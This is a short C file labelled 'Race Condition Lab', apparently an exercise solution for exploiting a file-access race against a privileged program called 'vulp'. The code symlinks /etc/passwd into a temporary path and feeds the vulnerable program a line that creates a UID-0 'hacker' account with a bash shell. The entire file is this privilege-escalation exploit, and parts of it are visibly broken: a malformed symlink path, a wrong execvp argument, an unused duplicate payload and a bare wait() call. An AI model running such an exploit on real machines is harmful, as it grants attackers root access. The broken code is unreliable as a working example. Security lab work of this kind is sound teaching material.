//Race Condition Lab
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv) {
	char* passwdPayload = "hacker:x:0:0:hacker:/:/bin/bash";
	char* shadowPayload = "hacker:x:0:0:hacker:/:/bin/bash";
	
	unlink("/tmp/XYZ");
	symlink("/etc/passwd", "tmp/XYZ");
	
	//Fork a child process to run vulp
	int pid = fork();
	if(pid == 0) {
		printf("Child Process running vulp\n");
		execvp("vulp", passwdPayload);
	}
	wait();
	printf("Parent Process\n");
	return 0;	
}
